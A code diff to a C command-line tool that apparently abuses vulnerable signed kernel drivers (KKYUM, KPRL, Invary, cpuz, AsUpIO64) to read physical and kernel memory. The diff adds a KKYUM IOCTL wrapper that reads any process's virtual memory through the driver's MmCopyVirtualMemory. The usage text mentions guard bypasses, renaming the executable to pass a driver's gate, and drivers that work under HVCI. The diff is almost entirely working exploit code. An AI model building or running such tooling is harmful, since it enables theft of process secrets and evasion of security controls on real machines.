@@ -1261,6 +1261,35 @@ static int kkyum_open(const char *device) {
     g_kkyum = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
     return g_kkyum != INVALID_HANDLE_VALUE;
 }
+// KKYUM IOCTL 0x22265C: direct process virtual-memory read.
+// Input: {u32 pid; u32 count=1; {u64 src_va; u64 dst_va; u64 size}}.
+// The driver does PsLookupProcessByProcessId + MmCopyVirtualMemory(target->caller).
+static int kkyum_build_process_read(uint32_t pid, uint64_t src_va, uint64_t dst_va,
+                                    uint32_t size, uint8_t out[32]) {
+    if (!out || !pid || !size) return 0;
+    memset(out, 0, 32);
+    *(uint32_t *)(out + 0) = pid;
+    *(uint32_t *)(out + 4) = 1;
+    *(uint64_t *)(out + 8) = src_va;
+    *(uint64_t *)(out + 16) = dst_va;
+    *(uint64_t *)(out + 24) = size;
+    return 1;
+}
+
+static int kkyum_read_process(uint32_t pid, uint64_t va, void *buf, uint32_t size,
+                              const char *device) {
+    if (!buf || !size) return 0;
+    const char *path = (device && device[0]) ? device : "\\\\.\\KKYUM";
+    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    uint8_t in[32];
+    DWORD ret = 0;
+    int ok = kkyum_build_process_read(pid, va, (uint64_t)(uintptr_t)buf, size, in) &&
+             DeviceIoControl(h, 0x22265Cu, in, sizeof(in), NULL, 0, &ret, NULL);
+    CloseHandle(h);
+    return ok ? 1 : 0;
+}
+
 static int kkyum_kread(mb_kernel_reader *kr, uint64_t va, void *buf, uint32_t size) {
     (void)kr;
     if (g_kkyum == INVALID_HANDLE_VALUE) return 0;
@@ -1985,6 +2014,15 @@ static int selftest_mock(void) {
     uint64_t located_cr3 = 0, eproc = 0;
     int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
                                           &located_cr3, &eproc) && located_cr3 == cr3;
+    // KKYUM direct process-read request layout (IOCTL 0x22265C, offline)
+    uint8_t kkproc[32];
+    int ok_kkproc = kkyum_build_process_read(4242, 0x7FF600000000ull, 0x12340000ull, 0x40, kkproc) &&
+                    *(uint32_t *)(kkproc + 0) == 4242 &&
+                    *(uint32_t *)(kkproc + 4) == 1 &&
+                    *(uint64_t *)(kkproc + 8) == 0x7FF600000000ull &&
+                    *(uint64_t *)(kkproc + 16) == 0x12340000ull &&
+                    *(uint64_t *)(kkproc + 24) == 0x40;
+    check("取数层(fetcher)", "kkyum direct process-read request layout (pid/src/dst/size)", ok_kkproc);
     check("定位层(locator)", "PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)", ok_loc);
     check("定位层(locator)", "fake EPROCESS PA=0x8000", ok_loc && eproc == 0x8000);
 
@@ -2128,6 +2166,7 @@ static void usage(void) {
     printf("  layers --locate --kprl --pid <pid> [--kprl-device <path>]     (KPRL CR3-by-PID; no physical reader needed)\n");
     printf("  layers --locate --invary --pid <pid> [--invary-device <path>] (Invary Sensor kernel-VA locator)\n");
     printf("  layers --locate --auto --pid <pid> [--scan-start/--scan-size | --auto-ranges]  (try all locators)\n");
+    printf("  layers --read-process --pid <pid> --va <hex> --size <n> [--kkyum-device <path>]  (KKYUM direct process VA read; HVCI-PASS driver)\n");
     printf("  layers --invary-read --va <hex> --size <n> [--invary-device <path>] (kernel-VA bytes via Invary)\n");
     printf("  note: --reader cpuz requires --expect-first <dword> (target page first dword, guard bypass)\n");
     printf("  note: --reader asupio64 requires layers.exe to be named PEUPDATER.EXE (AsUpIO64 gate)\n");
@@ -2141,7 +2180,7 @@ int main(int argc, char **argv) {
     int do_selftest = 0, do_read_phys = 0, do_write_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
     int use_la57 = 0, do_translate_only = 0;
     const char *data_hex = NULL;
-    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, do_invary_read = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_hvci = 0;
+    int do_ranges = 0, auto_ranges = 0, use_kkyum = 0, use_kprl = 0, use_invary = 0, use_auto = 0, do_invary_read = 0, do_read_process = 0, do_probe = 0, do_probe_loc = 0, do_probe_all = 0, do_list = 0, do_hvci = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--probe-readers") == 0) do_probe = 1;
@@ -2174,6 +2213,7 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--invary") == 0) use_invary = 1;
         else if (strcmp(argv[i], "--auto") == 0) use_auto = 1;
         else if (strcmp(argv[i], "--invary-read") == 0) do_invary_read = 1;
+        else if (strcmp(argv[i], "--read-process") == 0) do_read_process = 1;
         else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
         else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
@@ -2185,6 +2225,27 @@ int main(int argc, char **argv) {
     if (do_list) return list_providers();
     if (do_hvci) return hvci_status();
     if (do_probe_loc) return probe_locators();
+    if (do_read_process) {
+        if (!pid || !have_va || !size) {
+            printf("[ERR] --read-process needs --pid <pid> --va <hex> --size <n>\n");
+            return 6;
+        }
+        uint8_t *b = (uint8_t *)calloc(1, size);
+        if (!b) return 6;
+        if (!kkyum_read_process(pid, va, b, size, kkyum_device)) {
+            printf("[ERR] KKYUM direct process read failed (PID=%u VA=0x%llX size=%u; device %s)\n",
+                   pid, (unsigned long long)va, size,
+                   (kkyum_device && kkyum_device[0]) ? kkyum_device : "\\\\.\\KKYUM");
+            free(b);
+            return 5;
+        }
+        printf("[OK] KKYUM direct process read PID=%u VA=0x%llX size=%u:\n",
+               pid, (unsigned long long)va, size);
+        for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
+        printf("\nVERDICT=PASS\n");
+        free(b);
+        return 0;
+    }
     if (do_invary_read) {
         if (!invary_open(invary_device)) {
             printf("[ERR] Invary device open failed (need invarysensor.sys loaded)\n");
